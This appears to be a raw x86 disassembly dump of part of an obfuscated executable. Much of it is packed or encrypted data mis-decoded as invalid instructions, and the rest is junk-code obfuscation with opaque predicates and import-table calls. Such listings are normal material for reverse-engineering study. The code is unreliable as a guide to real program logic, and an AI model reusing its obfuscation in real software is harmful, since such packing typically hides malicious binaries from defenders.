  4190d3:	sub    eax,DWORD PTR [eax+0x121c6d42]
  4190d9:	test   eax,0xf4dcdb37
  4190de:	ins    DWORD PTR es:[edi],dx
  4190df:	jne    0x41907b
  4190e1:	pushf  
  4190e2:	jl     0x4190e6
  4190e4:	push   edx
  4190e5:	repz out 0x43,al
  4190e8:	mov    ecx,0x3ef71e76
  4190ed:	push   ds
  4190ee:	fistp  DWORD PTR [ecx-0x69]
  4190f1:	or     esi,DWORD PTR [edx+0x2c]
  4190f4:	inc    eax
  4190f5:	mov    esi,0x556697c3
  4190fa:	(bad)  
  4190fb:	out    0xc5,eax
  4190fd:	test   BYTE PTR [ebp+0x24239b3b],0x25
  419104:	add    bh,cl
  419106:	les    ebp,FWORD PTR [eax+ecx*4]
  419109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41910a:	or     eax,0x5fadbcad
  41910f:	neg    esi
  419111:	push   esp
  419112:	jns    0x4190f5
  419114:	in     al,0xb8
  419116:	stos   DWORD PTR es:[edi],eax
  419117:	test   eax,0xf9f87033
  41911c:	je     0x419143
  41911e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41911f:	(bad)  
  419120:	push   edx
  419121:	icebp  
  419122:	push   es
  419123:	jecxz  0x4190c9
  419125:	iret   
  419126:	dec    eax
  419127:	xlat   BYTE PTR ds:[ebx]
  419128:	pop    esp
  419129:	mov    ebp,0xed9143c0
  41912e:	pop    ecx
  41912f:	jno    0x4190e5
  419131:	nop
  419132:	dec    edx
  419133:	repnz xor ah,dh
  419136:	adc    ebx,DWORD PTR [edi+0xd2d247b]
  41913c:	aas    
  41913d:	mov    ch,0x62
  41913f:	xor    al,0xd4
  419141:	pop    edi
  419142:	fcmovnbe st,st(1)
  419144:	nop
  419145:	scas   eax,DWORD PTR es:[edi]
  419146:	pop    edi
  419147:	adc    esi,DWORD PTR [edi+0x7adc0095]
  41914d:	push   edi
  41914e:	(bad)  
  41914f:	pop    eax
  419150:	xchg   edx,eax
  419151:	fwait
  419152:	jno    0x419155
  419154:	neg    dl
  419156:	ret    
  419157:	sbb    eax,0x14d02b4f
  41915c:	pop    edi
  41915d:	sbb    ecx,edi
  41915f:	sbb    al,0x5c
  419161:	icebp  
  419162:	fcomp  QWORD PTR ds:0xc64f0a69
  419168:	pop    es
  419169:	in     eax,dx
  41916a:	(bad)  
  41916b:	fsubr  QWORD PTR ds:0x8be22c66
  419171:	pop    esp
  419172:	stos   BYTE PTR es:[edi],al
  419173:	push   esp
  419174:	push   edi
  419175:	pop    esi
  419176:	(bad)  
  419177:	fs and esi,esi
  41917a:	add    ah,0xe4
  41917d:	stc    
  41917e:	push   ss
  41917f:	stos   BYTE PTR es:[edi],al
  419180:	into   
  419181:	xor    dl,al
  419183:	into   
  419184:	icebp  
  419185:	mov    BYTE PTR [edi],ch
  419187:	leave  
  419188:	push   ebp
  419189:	xor    bl,BYTE PTR [ebp-0x1c]
  41918c:	mov    DWORD PTR ss:[ebp-0x6bb6bcd7],0xb632949e
  419197:	inc    esp
  419198:	xor    al,0x1e
  41919a:	dec    eax
  41919b:	push   esi
  41919c:	bound  esp,QWORD PTR [ecx+0x2b3fc3d2]
  4191a2:	pop    ebx
  4191a3:	push   esi
  4191a4:	sub    al,0x30
  4191a6:	repnz dec esi
  4191a8:	(bad)  
  4191a9:	scas   al,BYTE PTR es:[edi]
  4191aa:	mov    bl,0x24
  4191ac:	push   edi
  4191ad:	push   ebp
  4191ae:	mov    esi,0x2e5eae4c
  4191b3:	add    esp,eax
  4191b5:	arpl   WORD PTR [ecx],bx
  4191b7:	mov    ?,WORD PTR [edx]
  4191b9:	add    al,0xff
  4191bb:	loop   0x419206
  4191bd:	out    dx,eax
  4191be:	xchg   ecx,eax
  4191bf:	push   ss
  4191c0:	enter  0x479d,0x46
  4191c4:	mov    esp,0xc4b3d12c
  4191c9:	mov    esp,0xae4af844
  4191ce:	xchg   esp,eax
  4191cf:	popa   
  4191d0:	or     BYTE PTR [esi],ch
  4191d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191d3:	stos   BYTE PTR es:[edi],al
  4191d4:	or     BYTE PTR [edi],0x99
  4191d7:	aas    
  4191d8:	mov    al,0xfb
  4191da:	adc    edi,DWORD PTR [eax+ebp*4+0x12]
  4191de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191df:	lods   al,BYTE PTR ds:[esi]
  4191e0:	xchg   ebp,eax
  4191e1:	ins    DWORD PTR es:[edi],dx
  4191e2:	mov    eax,ds:0x7c64f0ee
  4191e7:	(bad)  
  4191e8:	in     eax,0x52
  4191ea:	jmp    0xc4061f83
  4191ef:	sahf   
  4191f0:	mov    esp,0xcb5fe687
  4191f5:	xchg   ecx,eax
  4191f6:	jecxz  0x419226
  4191f8:	push   cs
  4191f9:	sub    al,0x34
  4191fb:	dec    ecx
  4191fc:	xor    bh,bh
  4191fe:	loop   0x419196
  419200:	mov    esi,0x402fd2be
  419205:	or     al,0x16
  419207:	mov    ebx,0xa1f3fae2
  41920c:	lock data16 sti 
  41920f:	mov    esp,0xa2bdb0cc
  419214:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419215:	sub    edx,DWORD PTR [ebx-0x41417fc4]
  41921b:	pushf  
  41921c:	in     al,dx
  41921d:	or     edi,DWORD PTR [ebp+0x67]
  419220:	cmc    
  419221:	fwait
  419222:	cmp    eax,0x1fb73a70
  419227:	bswap  ebp
  419229:	cmc    
  41922a:	pop    esi
  41922b:	retf   0xe477
  41922e:	leave  
  41922f:	adc    edx,DWORD PTR [edx-0x28105c29]
  419235:	js     0x4191ca
  419237:	jg     0x419293
  419239:	xor    DWORD PTR [ebx-0x80],0x47b217f5
  419240:	fisubr WORD PTR [ebx-0x4693254]
  419246:	iret   
  419247:	bound  edi,QWORD PTR [eax+eax*1-0x50528485]
  41924e:	je     0x41924b
  419250:	loope  0x4191f8
  419252:	add    al,0x71
  419254:	jae    0x41924e
  419256:	jmp    0x41926b
  419258:	scas   eax,DWORD PTR es:[edi]
  419259:	xchg   edx,eax
  41925a:	add    ch,ah
  41925c:	jmp    0x41925a
  41925e:	xor    DWORD PTR [edx],ecx
  419260:	xor    ah,ah
  419262:	add    DWORD PTR [edi],eax
  419264:	pop    edi
  419265:	retf   
  419266:	iret   
  419267:	push   eax
  419268:	iret   
  419269:	xor    bl,al
  41926b:	sbb    DWORD PTR [edi+eiz*8+0xa],esi
  41926f:	and    BYTE PTR [edi-0x51a1ae11],bh
  419275:	test   eax,0x960114ee
  41927a:	(bad)  
  41927b:	(bad)  
  41927c:	nop
  41927d:	arpl   WORD PTR [ecx],di
  41927f:	ja     0x419265
  419281:	pusha  
  419282:	into   
  419283:	xchg   esi,eax
  419284:	xchg   ebx,eax
  419285:	mov    ds,WORD PTR [ebx+0x7c8d4796]
  41928b:	shl    dl,1
  41928d:	inc    edi
  41928e:	jmp    0x570c5cb2
  419293:	ja     0x41921b
  419295:	imul   eax,ecx,0x5832fd14
  41929b:	push   eax
  41929c:	je     0x4192e3
  41929e:	mov    edx,0x112e0ad0
  4192a3:	pop    ss
  4192a4:	jl     0x419267
  4192a6:	jne    0x419310
  4192a8:	aaa    
  4192a9:	in     eax,0x86
  4192ab:	les    ebx,FWORD PTR [ecx-0x20c95682]
  4192b1:	(bad)  
  4192b2:	mov    ds:0xa37f46f,eax
  4192b7:	fld    TBYTE PTR [ebx]
  4192b9:	xchg   edx,eax
  4192ba:	not    BYTE PTR [edx+0x7c]
  4192bd:	inc    ecx
  4192be:	or     BYTE PTR [esi+0x5929b54c],bl
  4192c4:	(bad)  
  4192c5:	rcr    BYTE PTR [esi-0x28db2531],cl
  4192cb:	mov    dh,0xac
  4192cd:	sti    
  4192ce:	jnp    0x419318
  4192d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192d1:	pop    esp
  4192d2:	xor    esi,esp
  4192d4:	ins    DWORD PTR es:[edi],dx
  4192d5:	out    dx,eax
  4192d6:	mov    dl,0xbc
  4192d8:	mov    al,ds:0xd748ea34
  4192dd:	and    eax,0x733d3e43
  4192e2:	loopne 0x419341
  4192e4:	mov    eax,ds:0x19724370
  4192e9:	sub    BYTE PTR ds:0x3e8e07d9,0x83
  4192f0:	pop    eax
  4192f1:	in     eax,dx
  4192f2:	fidivr WORD PTR [ebx]
  4192f4:	push   cs
  4192f5:	dec    ecx
  4192f6:	outs   dx,DWORD PTR ds:[esi]
  4192f7:	cmc    
  4192f8:	scas   eax,DWORD PTR es:[edi]
  4192f9:	or     edi,0x3a
  4192fc:	inc    ebp
  4192fd:	mov    ds:0xd5a6de67,eax
  419303:	repnz lds eax,FWORD PTR [ebp-0xd]
  419307:	(bad)  
  419309:	push   edi
  41930a:	cmp    DWORD PTR [edx],ebx
  41930c:	rcr    DWORD PTR [eax],1
  41930e:	pop    ds
  41930f:	mov    ebp,0xfacdf0e3
  419314:	sti    
  419315:	cmp    DWORD PTR [edx+0x1e039026],esp
  41931b:	call   0xd0ef:0x72f53431
  419322:	mov    dl,0xea
  419324:	retf   
  419325:	sub    al,0x31
  419327:	jnp    0x419379
  419329:	dec    ecx
  41932a:	out    dx,al
  41932b:	sub    BYTE PTR [ecx+0x3f],0x53
  41932f:	jne    0x419364
  419331:	shl    ecx,cl
  419333:	popf   
  419334:	sahf   
  419335:	lahf   
  419336:	xor    eax,DWORD PTR [esi]
  419338:	xchg   DWORD PTR [ecx+esi*2],ebp
  41933b:	adc    BYTE PTR ss:[ecx-0x5f3f0fe0],dh
  419342:	loope  0x4192ef
  419344:	mov    al,BYTE PTR [ecx]
  419346:	(bad)  
  419347:	out    dx,eax
  419348:	cdq    
  419349:	fcom   DWORD PTR [esi+0x18]
  41934c:	test   eax,0x202ae339
  419351:	adc    eax,0xdd2dd805
  419356:	and    al,0x32
  419358:	dec    esp
  419359:	int    0x3b
  41935b:	mov    esp,0x253afa21
  419360:	in     eax,0x3
  419362:	repnz sbb eax,0xe574d7f2
  419368:	cmc    
  419369:	nop
  41936a:	push   esi
  41936b:	xor    dl,dh
  41936d:	inc    edi
  41936e:	dec    ebp
  41936f:	shl    BYTE PTR [ebx],cl
  419371:	xorps  xmm2,XMMWORD PTR gs:[edx-0x7ba88593]
  419379:	add    eax,0xf76eb0e5
  41937e:	cmp    eax,0xcdb4cabe
  419383:	fmul   DWORD PTR [ecx-0xcc38ee]
  419389:	and    eax,0x2d559244
  41938e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41938f:	leave  
  419390:	jno    0x4193a3
  419392:	mov    dh,bh
  419394:	test   eax,0x5d93243e
  419399:	mov    DWORD PTR [ebx],edx
  41939b:	jg     0x419389
  41939d:	pushf  
  41939e:	imul   DWORD PTR [edx+edi*2-0x32d09f18]
  4193a5:	icebp  
  4193a6:	xchg   ebp,eax
  4193a7:	inc    edx
  4193a8:	sbb    BYTE PTR [ebp+0x1fb13b4d],0x2
  4193af:	test   BYTE PTR [ecx],dl
  4193b1:	in     al,0xb2
  4193b3:	shr    DWORD PTR [edi+0x53],0xce
  4193b7:	pop    edx
  4193b8:	or     ch,al
  4193ba:	arpl   WORD PTR [ecx-0x63],cx
  4193bd:	into   
  4193be:	test   BYTE PTR [edi+0x0],al
  4193c1:	sub    eax,0x32082db6
  4193c6:	adc    al,0xb9
  4193c8:	jl     0x419352
  4193ca:	xchg   edi,eax
  4193cb:	fwait
  4193cc:	daa    
  4193cd:	cmp    DWORD PTR [ecx-0x2a],ebp
  4193d0:	mov    esi,0x74872d35
  4193d5:	xor    cl,BYTE PTR [edx]
  4193d7:	pushf  
  4193d8:	and    DWORD PTR [edx],eax
  4193da:	or     al,0xa3
  4193dc:	or     DWORD PTR ds:0xc4515e8b,0x4926ebf5
  4193e6:	xor    bl,0x3a
  4193e9:	adc    DWORD PTR [ebp+0x76],edx
  4193ec:	clc    
  4193ed:	fstp   st(5)
  4193ef:	rcl    DWORD PTR [ebp+0x2549dc6a],cl
  4193f5:	popa   
  4193f6:	cmp    DWORD PTR [edx],ebp
  4193f8:	pop    ebx
  4193f9:	adc    DWORD PTR [ebx+0x34860510],ebp
  4193ff:	pop    esi
  419400:	push   0xfffffff7
  419402:	test   eax,0x2ace1931
  419407:	or     eax,0xd15fd92d
  41940c:	imul   BYTE PTR [esi-0x79]
  41940f:	mov    esp,0xaf83f455
  419414:	mov    ebp,0x4db39b2e
  419419:	push   ds
  41941a:	and    al,0xa8
  41941c:	or     al,0x1c
  41941e:	loopne 0x419484
  419420:	fmul   st(1),st
  419422:	add    BYTE PTR [edi-0x3afd1a8b],bl
  419428:	rol    BYTE PTR [edi-0x57b3eab3],1
  41942e:	mov    esp,0x5e28c5b8
  419433:	fcom   QWORD PTR [esp]
  419436:	es dec esi
  419438:	outs   dx,DWORD PTR ds:[esi]
  419439:	jmp    0x57b3:0xd73f60ed
  419440:	xchg   esp,eax
  419441:	mov    ?,eax
  419443:	add    DWORD PTR [eax],ecx
  419445:	(bad)  
  419446:	pop    ebp
  419447:	or     eax,0x8ba848f5
  41944c:	or     BYTE PTR [edi+0x2cd76bc7],ch
  419452:	mov    ecx,DWORD PTR [esp+0x84]
  419459:	shrd   eax,ecx,0x2
  41945d:	cmp    DWORD PTR ds:0x42824f,0x0
  419464:	mov    DWORD PTR ds:0x4283a7,ebx
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x4283b3,0x3a28
  419482:	cmp    DWORD PTR ds:0x42824f,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428e10
  41949a:	mov    DWORD PTR ds:0x42828b,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x4282f3
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x42832b,edx
  4194b2:	mov    DWORD PTR ds:0x4282b3,0x52b1
  4194bc:	or     DWORD PTR ds:0x42818b,edx
  4194c2:	and    DWORD PTR ds:0x42838f,ecx
  4194c8:	cmp    DWORD PTR ds:0x428337,0x0
  4194cf:	mov    DWORD PTR ds:0x428337,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x4282b3,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x4283b3,0x1b74
  4194fc:	mov    DWORD PTR ds:0x42818f,0x3203
  419506:	cmp    DWORD PTR ds:0x428337,0x0
  41950d:	jge    0x41953e
  419513:	push   0x4280cb
  419518:	push   0x4280af
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428ea4
  419528:	adc    DWORD PTR ds:0x428197,0x266f
  419532:	xor    DWORD PTR ds:0x42838f,ebx
  419538:	xor    DWORD PTR ds:0x428317,ecx
  41953e:	mov    DWORD PTR ds:0x428187,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428263
  41954e:	dec    DWORD PTR ds:0x428317
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x428307,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x42839b,0x4283b7
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x42819f,0x0
  419589:	mov    DWORD PTR ds:0x42818f,0x514f
  419593:	mov    DWORD PTR ds:0x428193,0x65eb
  41959d:	mov    DWORD PTR ds:0x428243,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x4282a3,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x42819f,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42805d
  4195cd:	push   0x428079
  4195d2:	call   DWORD PTR ds:0x428ea8
  4195d8:	adc    DWORD PTR ds:0x4282b7,ecx
  4195de:	and    DWORD PTR ds:0x4282ab,0x4c04
  4195e8:	add    DWORD PTR ds:0x428183,ebx
  4195ee:	and    DWORD PTR ds:0x42828f,0x6136
  4195f8:	add    DWORD PTR ds:0x428197,ebx
  4195fe:	mov    eax,ds:0x422568
  419603:	and    DWORD PTR ds:0x42831f,0x428287
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x42817b,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x4281a3,0x428177
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x428287,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x4282b7,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x42828f
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x4282a3,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x428193,0x428163
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x428297,0x42825f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x42817b
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x42817b,0x428307
  4196ab:	push   0x4223ec
  4196b0:	sbb    DWORD PTR ds:0x428293,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x42823b,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x42824f
  4196da:	sbb    DWORD PTR ds:0x428333,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428263,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x42827f,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x42824b,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x428383,0x0
  419713:	mov    edx,DWORD PTR ds:0x4282ff
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x42827b,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x428393,0x5836
  419737:	cmp    DWORD PTR ds:0x428383,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428e14
  41974d:	movzx  edx,BYTE PTR ds:0x42817b
  419754:	adc    DWORD PTR ds:0x428303,edx
  41975a:	movzx  edx,BYTE PTR ds:0x4282b7
  419761:	add    DWORD PTR ds:0x42819b,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x4282af,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x42819b,0x0
  419781:	mov    DWORD PTR ds:0x428263,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x42827b,ebx
  419797:	cmp    DWORD PTR ds:0x42819b,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428e18
  4197bf:	sub    DWORD PTR ds:0x428293,0x63b8
  4197c9:	add    DWORD PTR ds:0x42830f,0x42824f
  4197d3:	add    DWORD PTR ds:0x42826f,0x428197
  4197dd:	mov    ebx,DWORD PTR ds:0x4281b7
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x4282c7
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x428247,ecx
  4197f8:	and    DWORD PTR ds:0x42829f,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x42831f
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x42819b,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x428387,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x428327,0x6cf
  41984e:	mov    DWORD PTR ds:0x4283b3,0x6551
  419858:	cmp    DWORD PTR ds:0x42819b,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428eac
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x4283bb
  419891:	mov    ecx,DWORD PTR ds:0x4283bf
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x4282ab
  4198a2:	cmp    DWORD PTR ds:0x42816f,0x0
  4198a9:	mov    DWORD PTR ds:0x428163,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x42832f
  4198ba:	not    DWORD PTR ds:0x428323
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42816f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428e1c
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x428293
  4198e5:	and    DWORD PTR ds:0x42832b,edi
  4198eb:	mov    edx,DWORD PTR ds:0x4282ff
  4198f1:	sbb    DWORD PTR ds:0x428187,edx
  4198f7:	or     DWORD PTR ds:0x428317,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x428283,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x42822f
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x428233
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x428327,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x42823b,0x4551
  419946:	mov    DWORD PTR ds:0x42829f,0x487
  419950:	cmp    DWORD PTR ds:0x428327,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428e20
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x4282ff,0x75a
  419988:	sub    DWORD PTR ds:0x4282a7,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x42824b
  419999:	sub    ecx,DWORD PTR ds:0x4283af
  41999f:	mov    DWORD PTR ds:0x42824b,ecx
  4199a5:	cmp    DWORD PTR ds:0x42826b,0x0
  4199ac:	mov    DWORD PTR ds:0x428303,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42816b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x428387,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42826b,edi
  4199da:	cmp    DWORD PTR ds:0x42826b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x428243
  4199ec:	push   0x427f6b
  4199f1:	call   DWORD PTR ds:0x428eb0
  4199f7:	sub    DWORD PTR ds:0x4283b7,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x42832f
  419a03:	sbb    DWORD PTR ds:0x4282b7,ecx
  419a09:	adc    edx,DWORD PTR ds:0x42839b
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x428317,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x42830f,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x428327
  419a31:	xor    DWORD PTR ds:0x42823b,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x42823f
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx-0x2f8f7006]
  419a79:	sbb    DWORD PTR [edi+0x7c],esi
  419a7c:	jecxz  0x419a39
  419a7e:	push   ss
  419a7f:	sbb    BYTE PTR [edx+edx*1-0x1f60e7e8],bh
  419a86:	cdq    
  419a87:	fsubp  st(6),st
  419a89:	sti    
  419a8a:	xchg   edi,eax
  419a8b:	cmc    
  419a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a8d:	or     BYTE PTR [edi],bh
  419a8f:	std    
  419a90:	add    eax,esi
  419a92:	retf   0x79ab
  419a95:	xchg   eax,ebp
  419a97:	sbb    al,0xd4
  419a99:	sti    
  419a9a:	pop    ebx
  419a9b:	push   ds
  419a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a9d:	mov    ah,cl
  419a9f:	addr16 jnp 0x419b1f
  419aa2:	push   ebx
  419aa3:	sub    DWORD PTR [edi],ecx
  419aa5:	repz int3 
  419aa7:	mov    ebp,eax
  419aa9:	xor    DWORD PTR [ebp+0x5d],0xa5221a49
  419ab0:	cli    
  419ab1:	fistp  QWORD PTR [ebp+0x1b]
  419ab4:	(bad)  [ebp+0x78]
  419ab7:	xlat   BYTE PTR ds:[ebx]
  419ab8:	push   esi
  419ab9:	mov    al,0x2c
  419abb:	pushf  
  419abc:	sbb    BYTE PTR [edx-0x618f9e7e],al
  419ac2:	mov    edx,0x7e437095
  419ac7:	jmp    0x419b09
  419ac9:	and    eax,0x5614d0b3
  419ace:	(bad)  
  419acf:	rol    BYTE PTR [esi+0x32],cl
  419ad2:	inc    edx
  419ad3:	(bad)  
  419ad5:	imul   edi,DWORD PTR [eax+0x7],0xffffff9d
  419ad9:	leave  
  419ada:	in     eax,0x24
  419adc:	enter  0x5325,0x79
  419ae0:	adc    ecx,DWORD PTR [ebp-0x4b]
  419ae3:	dec    edx
  419ae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ae5:	lea    esp,[edi+edi*1-0x22]
  419ae9:	fldcw  WORD PTR [eax+edi*1-0x13]
  419aed:	push   es
  419aee:	imul   ecx,DWORD PTR [edi+0x1316cd11],0xffffffde
  419af5:	nop
  419af6:	stc    
  419af7:	ror    dh,0x5d
  419afa:	xchg   dh,al
  419afc:	cmp    edx,DWORD PTR [ecx]
  419afe:	daa    
  419aff:	call   0xfb0904d3
  419b04:	ins    BYTE PTR es:[edi],dx
  419b05:	call   0xf94ef81d
  419b0a:	and    BYTE PTR [edx-0x8caf276],bl
  419b10:	clc    
  419b11:	cmp    BYTE PTR cs:[ebp+0x2f209a42],bh
  419b18:	and    esp,DWORD PTR [eax-0x6baf055f]
  419b1e:	out    0x1f,al
  419b20:	retf   
  419b21:	mov    ch,BYTE PTR [ebx+ecx*4+0x78df41b0]
  419b28:	aas    
  419b29:	dec    ebx
  419b2a:	lds    edi,FWORD PTR [edx+0x15997980]
  419b30:	mov    bh,0x87
  419b32:	sub    edi,DWORD PTR [esi]
  419b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b35:	mov    bl,0x4c
  419b37:	cwde   
  419b38:	add    DWORD PTR [edx-0xe48624e],edi
  419b3e:	ds mov bh,0xf8
  419b41:	enter  0x19bf,0x67
  419b45:	mov    ebx,0xfcbbd060
  419b4a:	je     0x419b8d
  419b4c:	xor    eax,0x5af76044
  419b51:	cmp    edi,eax
  419b53:	rcr    DWORD PTR [ebp+0x3d41422a],1
  419b59:	scas   al,BYTE PTR es:[edi]
  419b5a:	cmp    BYTE PTR [edx],ah
  419b5c:	mov    ecx,0xd1c54415
  419b61:	push   ebp
  419b62:	push   eax
  419b63:	add    BYTE PTR [eax-0x5f],ah
  419b66:	xchg   BYTE PTR [ecx+eax*8],dl
  419b69:	rcl    DWORD PTR [esi-0x72dc06cf],cl
  419b6f:	test   al,0xaf
  419b71:	push   ebx
  419b72:	mov    ebp,0xbbe510df
